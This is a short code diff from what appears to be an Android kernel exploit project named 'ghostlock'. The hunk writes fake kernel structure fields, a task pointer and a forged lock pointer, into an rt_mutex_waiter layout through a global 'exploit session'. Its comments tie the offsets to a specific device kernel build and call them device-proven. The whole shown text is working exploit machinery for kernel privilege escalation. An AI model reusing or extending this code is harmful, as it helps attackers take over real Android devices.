@@ -397,7 +397,7 @@ namespace ghostlock::support {
                     *request, write_layout);
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                if (v->misc.compact_waiter.value_or(0) == 2) {
+                if (session::g_exploit_session.profile.effective_compact_waiter() == 2) {
                     /* 5.10 legacy rt_mutex_waiter (SO-54C 5.10.236-android12-9,
                      * layout.json-derived and device-proven): no wake_state.
                      * tree(0x00) pi_tree(0x18) task(0x30) lock(0x38) prio(0x40)
